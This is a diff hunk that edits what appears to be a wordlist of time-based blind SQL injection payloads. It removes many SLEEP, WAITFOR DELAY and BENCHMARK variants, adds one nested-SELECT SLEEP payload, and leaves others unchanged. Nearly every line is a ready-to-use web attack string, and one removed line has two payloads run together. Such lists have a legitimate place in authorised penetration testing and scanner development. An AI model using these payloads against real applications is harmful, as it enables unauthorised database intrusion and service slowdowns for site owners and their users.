@@ -31,33 +31,9 @@
 ]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1
 %' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337
 ' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337
-sleep(5)#
-1 or sleep(5)#
-" or sleep(5)#
-' or sleep(5)#
-" or sleep(5)="
-' or sleep(5)='
-1) or sleep(5)#
-") or sleep(5)="
-') or sleep(5)='
-1)) or sleep(5)#
-")) or sleep(5)="
-')) or sleep(5)='
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-"));waitfor delay '0:0:5'--
-benchmark(10000000,MD5(1))#
-1 or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1)") or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-AnD SLEEP(5)#
-&&SLEEP(5)
-&&SLEEP(5)--
 &&SLEEP(5)#
 ' AnD SLEEP(5) ANd '1
+AND (SELECT 3937 FROM (SELECT(SLEEP(5)))VRYO)
 '&&SLEEP(5)&&'1
 ORDER BY SLEEP(5)
 ORDER BY SLEEP(5)--
